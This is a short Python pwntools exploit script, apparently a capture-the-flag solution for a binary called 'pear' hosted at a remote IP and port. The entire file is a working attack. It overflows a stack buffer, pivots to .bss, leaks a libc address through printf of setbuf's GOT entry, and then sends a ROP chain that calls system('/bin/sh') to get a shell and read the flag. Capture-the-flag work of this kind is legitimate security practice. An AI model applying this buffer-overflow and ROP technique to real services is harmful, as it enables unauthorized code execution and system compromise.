from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pear"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("65.109.198.121", 5000)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


setbuf_got = elf.got["setbuf"]
printf_plt = elf.plt["printf"]
get_plt = elf.plt["gets"]
main = 0x4011D8
"""
0x000000000040115d : pop rbp ; ret
0x000000000040101a : ret
"""
pop_rbp = 0x40115d
ret = 0x40101a

bss = 0x404030 + 0x900
payload = b"a" * 0x80 + p64(bss) + p64(main)

io.sendlineafter(" your name", payload)

payload = p64(setbuf_got) + p64(0)
payload += p64(pop_rbp) + p64(bss + 0x100) + p64(main)
payload = payload.ljust(0x80, b"\x00")
payload += p64(0x4048b0 + 8) + p64(0x401186)
ddebug("break *0x040120A\n continue")
io.sendlineafter(" your name", payload)

io.recvuntil("Dear ", drop=True)
io.recvuntil("Dear ", drop=True)
leak = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = leak - libc.symbols["setbuf"]
log.success("libc.address :-----> " + hex(libc.address))
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
pop_rdi = next(libc.search(asm("pop rdi; ret")))

payload = b"c" * 0x80 + p64(0)
payload += p64(pop_rdi) + p64(binsh_addr)
payload += p64(ret)
payload += p64(system_addr)
io.sendlineafter(" your name", payload)

io.sendline(b"cat flag*")
io.interactive()
